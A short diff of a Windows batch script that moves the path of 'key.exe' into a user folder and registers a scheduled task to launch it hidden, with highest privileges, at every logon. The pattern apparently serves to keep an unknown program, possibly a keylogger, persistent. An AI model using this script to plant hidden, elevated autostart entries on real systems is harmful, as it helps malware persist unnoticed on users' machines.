@@ -1,7 +1,7 @@
 @echo off
 REM Define variables
 set TaskName=MyStartupTask
-set ProgramPath="C:\windows\key.exe"
+set ProgramPath="C:\users\usr1\key.exe"
 
 REM Create a scheduled task to run the program at startup
 schtasks /create /tn "%TaskName%" /tr "cmd.exe /c start /b %ProgramPath%" /sc onlogon /rl highest
